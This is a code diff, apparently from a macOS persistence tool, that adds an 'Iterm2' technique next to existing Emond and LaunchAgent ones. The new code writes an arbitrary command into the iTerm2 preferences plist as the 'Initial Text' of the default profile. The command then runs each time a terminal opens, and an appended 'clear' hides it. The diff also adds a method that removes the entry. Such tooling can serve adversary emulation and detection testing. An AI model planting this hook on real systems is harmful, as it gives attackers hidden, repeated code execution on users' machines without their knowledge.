@@ -115,6 +115,24 @@ class Emond(Technique):
         os.remove(f'/private/var/db/emondClients/{self.name}')
 
 
+class Iterm2(Technique):
+    def __init__(self, name, command):
+        super().__init__('Iterm2', name, command, root_required=False)
+        self.iterm2_plist = f'/Users/{os.getlogin()}/Library/Preferences/com.googlecode.iterm2.plist'
+
+    @Technique.execute
+    def run(self):
+        plist_data = get_plist(self.iterm2_plist)
+        plist_data['New Bookmarks'][0]['Initial Text'] = f'{self.command} && clear'
+        write_plist(self.iterm2_plist, plist_data)
+
+    @Technique.execute
+    def remove(self):
+        plist_data = get_plist(self.iterm2_plist)
+        plist_data['New Bookmarks'][0].pop('Initial Text')
+        write_plist(self.iterm2_plist, plist_data)
+
+
 class LaunchAgent(Technique):
     def __init__(self, name, command):
         super().__init__('LaunchAgent', name, command, root_required=True)
